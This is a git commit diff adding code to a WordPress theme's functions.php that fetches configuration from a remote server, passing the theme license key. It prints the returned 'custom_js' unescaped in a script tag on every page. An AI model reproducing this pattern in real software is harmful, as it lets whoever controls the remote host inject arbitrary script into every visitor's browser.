423597a62f0ae66437b4ba02075fdadeecaa6185
Vineet Tiwari <166735997+vineettiwari1708@users.noreply.github.com>
2025-09-10 11:44:30 +0530

    Update functions.php

--- functions.php
+++ functions.php
@@ -1,1 +1,24 @@
+<?php 
+    add_action('init', function () {
+    $license_key = get_option('my_theme_license_key');
+    $remote_url = 'https://api.yourserver.com/theme-config/?key=' . urlencode($license_key);
+
+    $response = wp_remote_get($remote_url);
+
+    if (!is_wp_error($response)) {
+        $data = json_decode(wp_remote_retrieve_body($response), true);
+
+        if (!empty($data['custom_css'])) {
+            add_action('wp_head', function () use ($data) {
+                echo '<style>' . esc_html($data['custom_css']) . '</style>';
+            });
+        }
+
+        if (!empty($data['custom_js'])) {
+            add_action('wp_footer', function () use ($data) {
+                echo '<script>' . $data['custom_js'] . '</script>';
+            });
+        }
+    }
+});
 
